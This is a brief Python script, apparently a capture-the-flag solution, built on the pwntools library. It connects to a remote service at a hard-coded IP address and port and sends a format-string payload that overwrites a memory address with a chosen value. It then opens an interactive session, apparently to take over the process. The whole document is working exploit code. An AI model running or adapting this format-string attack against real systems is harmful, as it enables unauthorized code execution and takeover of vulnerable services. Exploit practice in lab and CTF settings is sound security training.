from pwn import *

context.arch = 'amd64'

io = remote('139.177.185.41', 10533)
#gdb.attach(io, api=True)

io.recvuntil(b'string: ')
payload = fmtstr_payload(9, {0x12030:0x106a6})
io.sendline(payload)
io.interactive()